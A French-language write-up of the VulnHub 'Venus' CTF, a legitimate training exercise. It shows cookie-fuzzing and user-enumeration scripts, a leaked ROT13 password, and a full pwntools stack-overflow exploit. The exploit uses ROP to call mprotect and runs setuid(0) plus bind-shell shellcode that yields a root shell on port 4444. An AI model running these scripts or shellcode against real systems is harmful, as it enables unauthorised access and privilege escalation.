---
title: "Solution du CTF Venus de VulnHub"
tags: [CTF, VulnHub, binary exploitation]
---

Le CTF [Venus](https://vulnhub.com/entry/the-planets-venus,705/) de la série *The Planets*, créé par *SirFlash* et disponible sur *VulnHub*, est annoncé comme était de difficulté moyenne. Pour une fois, j'augmenterais le trait en disant qu'il est difficile.

Il faut un peu d'expérience pour la première partie qui requiert d'énumérer toutes les hypothèses, les essayer de manière approfondie (et avec des wordlists suffisamment grosses) et bien faire attention aux détails.

Pour l'escalade de privilèges, on passe sur un grand classique des CTFs mais (sans en dire davantage) quelques particularités corsent un peu l'exploitation. Il y a plusieurs façons d'arriver à ses fins sur cet exercice.

## Type "cookie", you idiot.

Sur le port 8080 on trouve un serveur web qui se présente comme `WSGIServer/0.2 CPython/3.9.5`.

J'ai déjà croisé cette bannière sur deux CTFs et à chaque fois, il y avait un *Django* derrière. Dans un cas comme ça, c'est généralement peu intéressant d'énumérer des noms de fichiers. On préférera faire une enumeration avec une liste de mots pour trouver des chemins d'API.

La page d'accueil est une mire de connexion avec le commentaire suivant :

> Credentials guest:guest can be used to access the guest account.

Une fois connecté on a des informations sur la planète Venus, mais c'est tout :

> Temperature: 464C  
> Surface pressure: 93 bar  
> Atmospheric composition: 96.5% carbon dioxide, 3.5% nitrogen

On regarde alors les cookies. Il y en a un qui est défini dans un format assez inhabituel avec des guillemets :

```
Set-Cookie: auth="Z3Vlc3Q6dGhyZmc="; Path=/
```

C'est bien sûr du base64 qui se décode de cette façon : `guest:thrfg` 

La seconde partie après le `:` correspond au ROT13 de `guest`.

J'ai fait la liste des hypothèses :

- on ignore la particularité du cookie et tente de bruteforcer un autre compte (ex : `admin`) sans être sûr qu'il existe

- on tente d'injecter des payloads dans le cookie encodé en base64 en espérant qu'une donnée soit utilisée pour du SQL ou du traitement de fichier

Pour l'attaque bruteforce on peut utiliser facilement `ffuf` :

```bash
ffuf -u http://192.168.56.177:8080/ -w wordlists/rockyou.txt -d 'username=admin&password=FUZZ'  -H 'Content-Type: application/x-www-form-urlencoded' -X POST -fs 651 -t 20
```

Après un bon moment, force est de constater qu'on n'est pas sur la bonne voie.

Pour l'autre possibilité je n'ai pas fait dans la dentelle en injectant toutes les wordlists `fuzzdb` d'attaque :

```python
import sys
import codecs
from base64 import b64encode
from glob import glob

import requests

def rot13(s: str) -> str:
    return codecs.encode(s, "rot-13")

def create_cookie(s: str) -> str:
    s = "guest:" + s
    return b64encode(s.encode(encoding="utf-8", errors="ignore")).decode()

sess = requests.session()


def process_filename(filename: str):
    global sess
    with open(filename, encoding="utf-8", errors="ignore") as fd:
        for line in fd:
            payload = line.strip()
            response = sess.get(
                    "http://192.168.56.177:8080/",
                    headers={"Cookie": f'auth="{create_cookie(payload)}"'}
            )
            if len(response.content) != 626 or response.status_code != 200:
                print("="* 30)
                print(response.status_code)
                print(payload)
                print(response.text)
                print("="* 30)


for filename in glob("fuzzdb/attack/**/*.txt"):
    print(filename)
    process_filename(filename)
```

Aucune injection n'a été détectée, mais ça a permis de mettre en évidence une vulnérabilité : si le cookie n'a pas la partie ROT13 (donc juste `guest:` ou même `guest`) alors l'authentification fonctionne tout de même.

Par conséquent, il n'est plus question de bruteforcer un mot de passe, mais un nom d'utilisateur :

```python
import sys
from base64 import b64encode

import requests

sess = requests.session()
with open(sys.argv[1], encoding="utf-8", errors="ignore") as fd:
    for line in fd:
        username = line.strip()
        payload = b64encode(username.encode()).decode()
        response = sess.get("http://192.168.56.177:8080/", headers={"Cookie": f'auth="{payload}";'})
        if len(response.content) != 626 or response.status_code != 200:
            print("=" * 30)
            print(response.status_code)
            print(username)
            print(response.content)
            sess = requests.session()
            print("=" * 30)
```

J'avais une wordlist `english` provenant certainement de [Packet Storm](https://packetstormsecurity.com/) mais elle n'a trouvé que les utilisateurs `guest` et `venus`. Avec une wordlist plus grande j'ai trouvé le compte qu'il fallait :

```console
$ python3 brute_users.py fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words-lowercase.txt 
==============================
200
guest
b'<html>\n<head>\n<title>Venus Monitoring</title>\n<style>\n.aligncenter {\n    text-align: center;\n}\n</style>\n</head>\n<body>\n<h1 class="aligncenter"> Venus Monitoring </h1>\n<p class="aligncenter">\n\n<img src="/static/venus1.jpg" alt="Pictures of Venus" width="400" height="400">\n</p>\n<br />\n<br />\n<h2>Current status:</h2>\nTemperature: 464C\n<br />\nSurface pressure: 93 bar\n<br />\nAtmospheric composition: 96.5% carbon dioxide, 3.5% nitrogen\n</body>\n</html>\n'
==============================
==============================
200
venus
b'<html>\n<head>\n<title>Venus Monitoring</title>\n<style>\n.aligncenter {\n    text-align: center;\n}\n</style>\n</head>\n<body>\n<h1 class="aligncenter"> Venus Monitoring </h1>\n<p class="aligncenter">\n\n<img src="/static/venus1.jpg" alt="Pictures of Venus" width="400" height="400">\n</p>\n<br />\n<br />\n<h2>Current status:</h2>\nTemperature: 464C\n<br />\nSurface pressure: 93 bar\n<br />\nAtmospheric composition: 96.5% carbon dioxide, 3.5% nitrogen\n</body>\n</html>\n'
==============================
==============================
200
magellan
b'<html>\n<head>\n<title>Venus Monitoring</title>\n<style>\n.aligncenter {\n    text-align: center;\n}\n</style>\n</head>\n<body>\n<h1 class="aligncenter"> Venus Monitoring </h1>\n<p class="aligncenter">\n\n<img src="/static/venus1.jpg" alt="Pictures of Venus" width="400" height="400">\n</p>\n<br />\n<br />\n<h2>Current status:</h2>\nTemperature: 464C\n<br />\nSurface pressure: 93 bar\n<br />\nAtmospheric composition: 96.5% carbon dioxide, 3.5% nitrogen\n</body>\n</html>\n'
==============================
```

Malheureusement la page sur laquelle tombe l'utilisateur `magellan` ets la même que les autres.

Il fallait être attentif au cookie retourné par le serveur lors de l'authentification qui est différent de celui que l'on soumet :

```console
$ echo -n magellan | base64 
bWFnZWxsYW4=
$ curl -I -H 'Cookie: auth="bWFnZWxsYW4=";' http://192.168.56.177:8080/
HTTP/1.1 200 OK
Date: Thu, 15 Apr 2023 15:40:55 GMT
Server: WSGIServer/0.2 CPython/3.9.5
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Content-Length: 450
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  auth="bWFnZWxsYW46aXJhaGZ2bmF0cmJ5YnRsMTk4OQ=="; Path=/
$ echo bWFnZWxsYW46aXJhaGZ2bmF0cmJ5YnRsMTk4OQ== | base64 -d
magellan:irahfvnatrbybtl1989
$ echo irahfvnatrbybtl1989 | tr 'n-za-mN-ZA-M' 'a-zA-Z'
venusiangeology1989
```

Le cookie retourné inclus le mot de passe de l'utilisateur. Cela aurait encore été plus clair au début si l'utilisateur `guest` avait un mot de passe différent du nom d'utilisateur.

## This is the end, my friend. Thank you for calling.

Les identifiants permettent de se connecter via SSH et de récupérer le premier flag :

```console
[magellan@venus ~]$ cat user_flag.txt
[user_flag_e799a60032068b27b8ff212b57c200b0]
```

Une énumération ne remonte rien de particulier si ce n'est ce binaire qui tourne avec les droits `root` :

```
root         697  0.0  0.0   2384   524 ?        Ss   08:03   0:00 /usr/bin/venus_messaging
```

On n'est pas `root` donc on ne peut pas directement voir quel port l'exécutable a ouvert via `ss -lntp` mais je remarque un port 9080 qui est protégé des accès extérieurs par le parefeu.

En m'y connectant avec le netcat de la VM, il n'y a aucun doute que les deux soient liés :

> Welcome to the Venus messaging service.  
> To continue, please enter your password:

Le binaire n'est pas setuid root. C'est un binaire 64bits linké dynamiquement.

Points importants :

* NX est actif

* Pas de canary (stack protector off)

* ASLR est désactivée sur le système (`0` dans `/proc/sys/kernel/randomize_va_space`)

Quand on ouvre le binaire dans `Cutter` on trouve vite trouve le mot de passe demandé en regardant la fonction `main` :

```nasm
0x00401280      mov     qword [s1], str.loveandbeauty ; 0x402010
;;; snip ;;;
0x00401432      lea     rdx, [buffer]
0x00401439      mov     rax, qword [s1]
0x0040143d      mov     rsi, rdx   ; const char *s2
0x00401440      mov     rdi, rax   ; const char *s1
0x00401443      call    strcmp     ; sym.imp.strcmp ; int strcmp(const char *s1, const char *s2)
0x00401448      test    eax, eax
0x0040144a      jne     0x401471
0x0040144c      mov     eax, dword [fildes]
0x0040144f      mov     ecx, 0     ; int flags
0x00401454      mov     edx, 0x6c  ; 'l' ; 108 ; size_t length
0x00401459      mov     esi, str.Access_granted__you_can_now_send_messages_to_the_Venus_space_station._Please_enter_message_to_be_processed: ; 0x402100 ; void *buffer
```

Une fois l'authentification passée, la fonction `recv_message` suivante est utilisée :

```nasm
recv_message (uint64_t arg1);
; arg uint64_t arg1 @ rdi
; var uint64_t socket @ stack - 0x41c
; var const char *buffer @ stack - 0x418
; var int64_t var_410h @ stack - 0x410
; var size_t length @ stack - 0x408
; var ssize_t var_ch @ stack - 0xc
0x004014bc      push    rbp
0x004014bd      mov     rbp, rsp
0x004014c0      sub     rsp, 0x420
0x004014c7      mov     dword [socket], edi ; arg1
0x004014cd      mov     qword [buffer], 0
0x004014d8      mov     qword [var_410h], 0
0x004014e3      lea     rdx, [length]
0x004014ea      mov     eax, 0
0x004014ef      mov     ecx, 0x7e  ; '~' ; 126
0x004014f4      mov     rdi, rdx
0x004014f7      rep     stosq qword [rdi], rax
0x004014fa      lea     rsi, [buffer] ; void *buffer
0x00401501      mov     eax, dword [socket]
0x00401507      mov     ecx, 0     ; int flags
0x0040150c      mov     edx, 0x800 ; 2048 ; size_t length
0x00401511      mov     edi, eax   ; int socket
0x00401513      call    recv       ; sym.imp.recv ; ssize_t recv(int socket, void *buffer, size_t length, int flags)
0x00401518      mov     dword [var_ch], eax
0x0040151b      cmp     dword [var_ch], 0
0x0040151f      jle     0x401577
0x00401521      mov     eax, dword [var_ch]
0x00401524      sub     eax, 1
0x00401527      cdqe
0x00401529      mov     byte [rbp + rax - 0x410], 0
0x00401531      mov     edi, str.Message_received: ; 0x4021ec ; const char *s
0x00401536      call    puts       ; sym.imp.puts ; int puts(const char *s)
0x0040153b      lea     rax, [buffer]
0x00401542      mov     rdi, rax   ; const char *s
0x00401545      call    puts       ; sym.imp.puts ; int puts(const char *s)
0x0040154a      mov     eax, dword [socket]
0x00401550      mov     ecx, 0     ; int flags
0x00401555      mov     edx, 0x38  ; '8' ; 56 ; size_t length
0x0040155a      mov     esi, str.Message_sent_to_the_Venus_space_station._Enter_message: ; 0x402200 ; void *buffer
0x0040155f      mov     edi, eax   ; int socket
0x00401561      call    send       ; sym.imp.send ; ssize_t send(int socket, void *buffer, size_t length, int flags)
0x00401566      mov     edi, str.Message_acknowledgement_sent. ; 0x402239 ; const char *s
0x0040156b      call    puts       ; sym.imp.puts ; int puts(const char *s)
0x00401570      mov     eax, 1
0x00401575      jmp     0x40157c
0x00401577      mov     eax, 0
0x0040157c      leave
0x0040157d      ret
```

On voit ici que `0x420` octets sont réservés pour la stack frame (instruction `sub rsp`) alors que l'appel à `recv` autorise la récupération de `0x800` octets de données. C'est donc un cas de stack overflow.

Je balance une chaine cyclique générée par `pwntools`, mais le `pattern_create` de *Metasploit* ferait tout aussi bien le travail. Je dois faire le débug localement, d'abord parce que le port est déjà utilisé par l'instance qui fonctionne en root mais surtout parce que `gdb` est absent de la VM (ça s'est avéré assez embêtant).

```
[----------------------------------registers-----------------------------------]
RAX: 0x1 
RBX: 0x7fffffffda88 --> 0x7fffffffdf23 ("/tmp/venus_messaging")
RCX: 0x7ffff7ea8e64 (<write+22>:        cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x4052a0 ("Message acknowledgement sent.\naaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
RDI: 0x7ffff7f93fd0 --> 0x0 
RBP: 0x6b61616c6b61616b ('kaaklaak')
RSP: 0x7fffffffd508 ("maaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaam"...)
RIP: 0x40157d (<recv_message+193>:      ret)
R8 : 0xe0c0 
R9 : 0x0 
R10: 0x0 
R11: 0x202 
R12: 0x0 
R13: 0x7fffffffda98 --> 0x7fffffffdf38 ("SHELL=/bin/bash")
R14: 0x7ffff7ffd000 --> 0x7ffff7fc1000 --> 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401575 <recv_message+185>: jmp    0x40157c <recv_message+192>
   0x401577 <recv_message+187>: mov    eax,0x0
   0x40157c <recv_message+192>: leave  
=> 0x40157d <recv_message+193>: ret    
   0x40157e:    xchg   ax,ax
   0x401580 <__libc_csu_init>:  endbr64 
   0x401584 <__libc_csu_init+4>:        push   r15
   0x401586 <__libc_csu_init+6>:        lea    r15,[rip+0x2883]        # 0x403e10
[------------------------------------stack-------------------------------------]
```

`peda` nous donne bon nombre d'informations intéressantes. Le stack overflow a bien lieu dans `recv_message` avec l'écrasement de `rip` lors de l'instruction `ret`.

Le saut n'a pas été pris, car l'adresse mémoire est soit non mappée, soit non exécutable. Dans tous les cas, la chaine pointée par `rsp` nous permet de déterminer l'offset où le programme cherche son adresse de retour.

On n'a aucun autre registre qui a une valeur vraiment utile. J'ai d'abord cru que `r14` correspondait à la base de la stack alors qu'il s'agit de la zone pour le linker (`/usr/lib64/ld-2.33.so`)... Ca a dû me faire prendre une bonne heure 😅

On a d'autres difficultés dues au fait que le binaire soit déjà lancé et écouté sur un port :

* on ne contrôle pas son environnement donc impossible de profiter d'un shellcode ou ROP chain dans une variable d'environnement

* on ne peut pas faire exécuter un shell simplement, car stdin / stdout ne sont pas redirigés sur le socket

* on ne peut pas voir le mapping mémoire du binaire (`/proc/pid/maps`) car il tourne en `root`

Après, quel que soit le binaire, avec l'ASLR désactivé l'adresse de la stack est stable :

```console
[magellan@venus ~]$ cat /proc/self/maps | grep stack
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
[magellan@venus ~]$ tac /proc/self/maps | grep stack
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
[magellan@venus ~]$ more /proc/self/maps | grep stack
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
[magellan@venus ~]$ less /proc/self/maps | grep stack
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
```

On a vu qu'on ne peut pas faire exécuter `/bin/sh` à cause des entrées / sorties, mais on pourrait faire exécuter autre chose en fonction des chaines de caractères présentes en mémoire.

On ne peut pas se servir de la chaine `loveandbeauty` car on ne dispose pas de permissions suffisantes pour placer un exécutable de ce nom dans le PATH de l'exécutable.

Au passage, j'ai remarqué un chemin intéressant sur une libc récente :

```console
$ strings -t x -a /lib64/libc.so.6 | grep "/dev/shm".
 1a98f9 /dev/shm/
 1b2330 /dev/shm/sem.XXX
```

Cette dernière chaine n'est pas présente dans la libc de la VM mais ça peut être intéressant pour des exploitations futures :)

La méthode d'exploitation que j'ai retenue consiste à utiliser `mprotect` via *Return Oriented Programming* pour rendre la stack exécutable (désactiver NX) puis sauter sur un shellcode qu'on aura placé juste après.

Faute de `gdb`, je suis parvenu à obtenir l'adresse mémoire de `mprotect` en additionnant l'adresse de la stack et l'offset de `mprotect` dans `/lib64/libc.so.6` :

```
[magellan@venus ~]$ ldd /usr/bin/venus_messaging
        linux-vdso.so.1 (0x00007ffff7fc9000)
        libc.so.6 => /lib64/libc.so.6 (0x00007ffff7dee000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
[magellan@venus ~]$ nm -D /lib64/libc.so.6 | grep mprotect
00000000000fb070 T __mprotect@@GLIBC_PRIVATE
00000000000fb070 W mprotect@@GLIBC_2.2.5
0000000000100a50 T pkey_mprotect@@GLIBC_2.27
```

Petit rappel sur la convention d'appel des fonctions en x86_64 :

> First six arguments are in rdi, rsi, rdx, rcx, r8d, r9d; remaining arguments are on the stack.

`mprotect` prenant trois arguments, il me faut des gadgets (trouvés avec `ROPgadget`) pour remplir chacun des registres. Il me faut aussi un gadget pour sauter sur la stack :

```nasm
; offsets trouvés en local pour les tests
; binary
0x00000000004015e3 : pop rdi ; ret
0x00000000004015e1 : pop rsi ; pop r15 ; ret

; libc
0x0000000000089688 : pop rax ; pop rdx ; pop rbx ; ret
0x0000000000032bf6 : push rsp ; ret
```

Voici mon exploit final :

```python
import sys                                                                                                             
                                                                                                                       
from pwnlib.tubes.remote import remote                                                                                 
from pwnlib.util.packing import p64                                                                                    
                                                                                                                       
# gadgets from binary                                                                                                  
pop_rdi_ret = 0x004015e3                                                                                               
pop_rsi_r15_ret = 0x4015e1                                                                                             
                                                                                                                       
if sys.argv[1] == "local":                                                                                             
    libc_base = 0x7ffff7da6000                                                                                         
    stack_base = 0x7ffffffdd000                                                                                        
    mprotect = libc_base + 0x10d190                                                                                    
    # gadgets from libc                                                                                                
    pop_rax_rdx_rbx_ret = libc_base + 0x89688                                                                          
    push_rsp_ret = libc_base + 0x32bf6                                                                                 
else:                                                                                                                  
    libc_base = 0x7ffff7dee000                                                                                         
    stack_base = 0x7ffffffde000                                                                                        
    mprotect = libc_base + 0xfb070                                                                                     
    # gadgets from libc                                                                                                
    pop_rax_rdx_rbx_ret = libc_base + 0x13a7a5                                                                         
    push_rsp_ret = libc_base + 0x3c4bd                                                                                 
                                                                                                                       
payload = p64(0xdeadbeefdeadbeef) * 131                                                                                
payload += p64(pop_rdi_ret)                                                                                            
payload += p64(stack_base)  # premier argument : adresse mémoire                                                       
payload += p64(pop_rsi_r15_ret)                                                                                        
payload += p64(0x0101010101010101)  # second argument : taille mémoire                                                 
payload += p64(0xdeadbeefdeadbeef)                                                                                     
payload += p64(pop_rax_rdx_rbx_ret)                                                                                    
payload += p64(0xdeadbeefdeadbeef)                                                                                     
payload += p64(7)  #  troisième argument : permissions (RWX)                                                          
payload += p64(0xdeadbeefdeadbeef)                                                                                     
payload += p64(mprotect)                                                                                               
payload += p64(push_rsp_ret)  # on saute sur le shellcode qui suit
payload += (                                                                                                           
    # setuid(0)                                                                                                        
    b"\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"                                                                        
    # bind port 4444                                                                                                   
    b"\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2"                                                    
    b"\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c"                                                    
    b"\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05"                                                    
    b"\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89"                                                    
    b"\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f"                                                    
    b"\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21"                                                    
    b"\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68"                                                    
    b"\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89"                                                    
    b"\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"                                                                    
)                                                                                                                      
payload += b"\n"                                                                                                       
                                                                                                                       
r = remote("127.0.0.1", 9080)                                                                                          
r.recvuntil(b"To continue, please enter your password:")                                                               
r.send(b"loveandbeauty\n")                                                                                             
r.recvuntil(b"Please enter message to be processed:")                                                                  
r.send(payload)                                                                                                        
print(r.recv(1024))                                                                                                    
r.close()
```

Je me suis rendu après coup que j'aurais pu utiliser les fonctionnalités de `pwntools` pour obtenir et calculer les adresses mémoires au lieu de le faire manuellement...

Pour l'exploitation je forwarde d'abord le port 9080 sur ma machine :

```bash
ssh -N -L 9080:127.0.0.1:9080 magellan@192.168.56.177
```

Une fois l'exploit lancé on obtient notre shell `root` sur le port 4444 :

```console
[magellan@venus ~]$ nc 127.0.0.1 4444 -v
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 127.0.0.1:4444.
id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
cd /root
ls
anaconda-ks.cfg
root_flag.txt
cat root_flag.txt
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Congratulations on completing Venus!!!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_83588a17919eba10e20aad15081346af]
```

## Solutions alternatives

Je suis content d'avoir utilisé la méthode `mprotect` qui me trainait en tête depuis un moment, mais j'ai vu d'autres solutions sur le web :

[mcl0x90](https://medium.com/@mcl0x90/the-planets-venus-vulnhub-write-up-f6727d08bafb) utilise le fait que l'ASLR soit désactivé pour mettre un path dans son payload et tenter de deviner l'adresse de cette chaine pour appeler `system`. C'est assez hasardeux, car on n'a pas de vue sur les adresses mémoire. Il répète le path dans son payload pour augmenter ses chances, mais ça aurait été plus judicieux de préfixer le path d'un millier de `/`.

[datajerk](https://github.com/datajerk/ctf-write-ups/tree/master/vulnhub/venus) a utilisé la technique consistant à faire fuiter l'adresse d'une fonction de la libc pour ensuite calculer l'adresse de `system`. Il utilise le fait que le socket correspond généralement au file descriptor `4`. Il réutilise aussi la fonction `recv` pour passer par exemple la commande qu'il souhaite faire exécuter. Il s'est bien pris la tête, mais son exploit fonctionnerait même si l'ASLR était activé.
